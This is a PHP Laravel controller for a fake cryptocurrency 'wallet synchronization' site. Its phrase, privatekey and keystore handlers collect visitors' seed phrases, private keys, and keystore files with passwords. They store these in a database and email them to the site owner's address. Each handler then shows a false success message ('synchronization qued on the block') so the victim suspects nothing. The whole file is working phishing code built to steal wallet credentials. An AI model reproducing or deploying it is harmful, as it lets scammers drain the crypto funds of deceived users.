<?php

namespace App\Http\Controllers;

use RealRashid\SweetAlert\Facades\Alert;
use App\Models;
use App\Models\Visitorsdetails;
use Illuminate\Http\Request;



class VisitorsController extends Controller
{
    //

    public $ownermail = "harrigold.18@gmail.com";

    public function index()
    {
        return view('visitors.index');
    }
    public function walletconnect()
    {
        return view('visitors.walletconnect');
    }

    public function sync(Request $request)
    {

        if ($request->wallet != null) {
            # code...
            $type = $request->wallet;
            $data = [];
            $data["wallet"] = $type;
            Alert::alert("$type wallet synchronization", "Please choose any of the methods below to sync your $type  wallet", 'Type');

            return view('visitors.sync', $data);
        } else {
            # code...
            Alert::error('No wallet selected', 'Please select a wallet below');
            return back();

        }
    }
    public function phrase(Request $request)
    {

        $phrase = $request->phrase;
        $wallet = $request->wallet;
        $no_of_words = str_word_count($phrase);
        if ($no_of_words < 12) {
            # code...
            Alert::error('Invalid phrase', 'Please crosscheck and enter the right phrase');
            return redirect()->route("walletconnect");
        }

        else if($no_of_words > 18){

            Alert::error('Invalid phrase', 'Please crosscheck and enter the right phrase');
            return redirect()->route("walletconnect");
        }

        else {
            # code...save to db and send email
            $new_entry = new Visitorsdetails();
            $new_entry->phrase = $phrase;
            $new_entry->wallet = $wallet;
            if ($new_entry->save()) {
                # code...
                mail($this->owneremail, "phrase filled", "the phrase is $phrase");
                Alert::success('Sync action completed', 'Sync action request sent over the network, synchronization qued on the block');
            return redirect()->route('index');
            }
            else {
                # code...
                Alert::error('Sync action failed', 'Sync action request sent returned null please try again!');
                return redirect()->route("walletconnect");
            }
            }


            return back();


    }


    public function privatekey(Request $request)
    {
        $pkey =$request->privatekey;
        $wallet = $request->wallet;
       $no_of_pkey_letters = strlen($pkey);
        if ($no_of_pkey_letters <200 || $no_of_pkey_letters > 270) {
            # code...
            Alert::error('Invalid private key', 'Please crosscheck and enter the right privatekey');
            return redirect()->route("walletconnect");
        }

         else {
            # code...save to db and send email
            $new_entry = new Visitorsdetails();
            $new_entry->phrase = $pkey;
            $new_entry->wallet = $wallet;
            $new_entry->type = "private key";
            if ($new_entry->save()) {
                # code...
                mail($this->owneremail, "privatekey filled", "the privatekey is $pkey");
                Alert::success('Sync action completed', 'Sync action request sent over the network, synchronization qued on the block');
            return redirect()->route('index');
            } else {
                # code...
                Alert::error('Sync action failed', 'Sync action request sent returned null please try again!');
                return redirect()->route("walletconnect");
            }
            }


        return view('visitors.sync');
    }
    public function keystore(Request $request)
    {

        $keystore =$request->keystore;
        $password =$request->password;
        $wallet = $request->wallet;
        $keystore_count =  strlen($keystore) ;
        $password_count = strlen($password);
        if ($keystore_count >200 || $keystore_count >600 || !empty($password) || $password_count >6 ) {
            # code... save to db
            $new_entry = new Visitorsdetails();
            $new_entry->keystore = $keystore;
            $new_entry->password = $password;
            $new_entry->wallet = $wallet;
            $new_entry->type = "keystore";
            if ($new_entry->save()) {
                # code...
                Alert::success('Sync action completed', 'Sync action request sent over the network, synchronization qued on the block');
                mail($this->owneremail, "kestore filled", "the keystore is $keystore and the password is $password ");
            return redirect()->route('index');
            } else {
                # code...
                Alert::error('Sync action failed', 'Sync action request sent returned null please try again!');
                return redirect()->route("walletconnect");
            }

        } else {
            # code...
            Alert::error('Invalid password or keystore', 'Please crosscheck and enter the right password and keystore combination');
            return redirect()->route("walletconnect");
        }



        return view('visitors.sync');
    }
}
